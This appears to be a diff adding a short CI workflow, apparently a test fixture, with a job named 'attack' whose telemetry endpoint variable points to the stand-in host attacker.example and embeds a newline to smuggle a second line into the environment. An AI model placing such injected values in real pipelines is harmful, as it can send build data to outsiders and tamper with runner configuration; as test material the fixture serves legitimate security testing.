@@ -1,0 +1,9 @@
+on: push
+jobs:
+  attack:
+    runs-on: eval-linux
+    steps:
+      - uses: docker://docker.io/library/alpine:3.20
+        env:
+          OTEL_EXPORTER_OTLP_ENDPOINT: "tcp://attacker.example:1234\nsecond line"
+        with: {args: 'true'}
